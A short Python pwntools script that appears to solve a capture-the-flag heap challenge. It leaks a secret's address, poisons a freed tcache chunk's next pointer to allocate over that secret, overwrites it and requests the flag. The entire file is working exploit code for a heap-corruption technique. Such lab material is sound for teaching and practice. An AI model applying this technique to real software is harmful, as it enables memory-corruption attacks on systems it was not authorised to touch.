#!/bin/python 

from pwn import *
import sys

def malloc(idx, size):
    proc.sendline(b"malloc")
    proc.sendline(str(idx))
    proc.sendline(str(size))


proc = process(sys.argv[1])
proc.recvuntil(b"secret stored at ")
secret_addr = int(proc.recvline()[:-2], 16) - 8
secret = b''

for i in range(1):
    malloc(0,100)
    malloc(1,100)

    proc.sendline(b"free")
    proc.sendline(b"1")
    proc.sendline(b"free")
    proc.sendline(b"0")

# overwriting first entry (*next) of freed space to point to data we want 
    proc.sendline(b"scanf")
    proc.sendline(b"0")
    proc.sendline(p64(secret_addr))

    malloc(1, 100)
    malloc(0, 100)
    
    proc.sendline(b"scanf")
    proc.sendline(b"0")
    proc.sendline(b'A' * (16 + 8))

    proc.sendline(b"puts")
    proc.sendline(b"0")

proc.sendline(b"send_flag")
proc.sendline(b'A' * 16)
proc.interactive()
